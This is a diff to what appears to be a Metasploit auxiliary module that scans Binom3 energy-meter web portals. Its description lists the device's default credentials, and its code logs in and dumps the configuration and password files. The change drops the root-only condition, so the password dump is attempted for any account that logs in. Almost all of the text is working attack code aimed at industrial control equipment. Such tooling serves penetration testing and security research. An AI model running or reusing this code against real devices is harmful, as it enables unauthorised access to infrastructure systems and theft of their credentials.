@@ -16,11 +16,10 @@ class MetasploitModule < Msf::Auxiliary
       'Name' => 'Binom3 Web Management Login Scanner, Config and Password File Dump',
       'Description' => %{
           This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer management login portal(s), and attempts to identify valid credentials. There are four (4) default accounts - 'root'/'root', 'admin'/'1', 'alg'/'1', 'user'/'1'. In addition to device config, 'root' user can also access password file. Other users - admin, alg, user - can only access configuration file. The module attempts to download configuration and password files depending on the login user credentials found.
-
       },
       'References' =>
         [
-          ['URL', 'https://ics-cert.us-cert.gov/alerts/ICS-ALERT-16-263-01']
+          ['URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-031-01']
         ],
       'Author' =>
         [
@@ -149,18 +148,18 @@ class MetasploitModule < Msf::Auxiliary
       get_cookie = res.get_cookies
       cookie = get_cookie + ' NO-HELP=true; onlyRu=1'
 
-      # Attempting to download config / password file(s)
+      # Attempting to download config file
 
       config_uri = '~cfg_ask_xml?type=cfg'
 
       res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })
 
       if res && res.code == 200
-        print_good('++++++++++++++++++++++++++++++++++++++')
-        print_good("#{rhost} - dumping configuration")
-        print_good('++++++++++++++++++++++++++++++++++++++')
+        vprint_status('++++++++++++++++++++++++++++++++++++++')
+        vprint_status("#{rhost} - dumping configuration")
+        vprint_status('++++++++++++++++++++++++++++++++++++++')
 
-        print_good("#{rhost}:#{rport} - File retrieved successfully!")
+        print_good("#{rhost}:#{rport} - Configuration file retrieved successfully!")
         path = store_loot(
           'Binom3_config',
           'text/xml',
@@ -169,35 +168,33 @@ class MetasploitModule < Msf::Auxiliary
           rport,
           'Binom3 device config'
         )
-        print_status("#{rhost}:#{rport} - File saved in: #{path}")
+        print_status("#{rhost}:#{rport} - Configuration file saved in: #{path}")
       else
         print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
         return
       end
 
-      if user == 'root'
-        config_uri = '~cfg_ask_xml?type=passw'
-        res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })
+      # Attempt to dump password file
+      config_uri = '~cfg_ask_xml?type=passw'
+      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })
 
-        if res && res.code == 200
-          print_good('++++++++++++++++++++++++++++++++++++++')
-          print_good("#{rhost} - dumping password file")
-          print_good('++++++++++++++++++++++++++++++++++++++')
+      if res && res.code == 200
+        vprint_status('++++++++++++++++++++++++++++++++++++++')
+        vprint_status("#{rhost} - dumping password file")
+        vprint_status('++++++++++++++++++++++++++++++++++++++')
 
-          print_good("#{rhost}:#{rport} - File retrieved successfully!")
-          path = store_loot(
-            'Binom3_passw',
-            'text/xml',
-            rhost,
-            res.body,
-            rport,
-            'Binom3 device config'
-          )
-          print_status("#{rhost}:#{rport} - File saved in: #{path}")
-        else
-          print_error("#{rhost}:#{rport} - Failed to retrieve password file")
-          return
-        end
+        print_good("#{rhost}:#{rport} - Password file retrieved successfully!")
+        path = store_loot(
+          'Binom3_passw',
+          'text/xml',
+          rhost,
+          res.body,
+          rport,
+          'Binom3 device config'
+        )
+        print_status("#{rhost}:#{rport} - Password file saved in: #{path}")
+      else
+        return
       end
     else
       print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
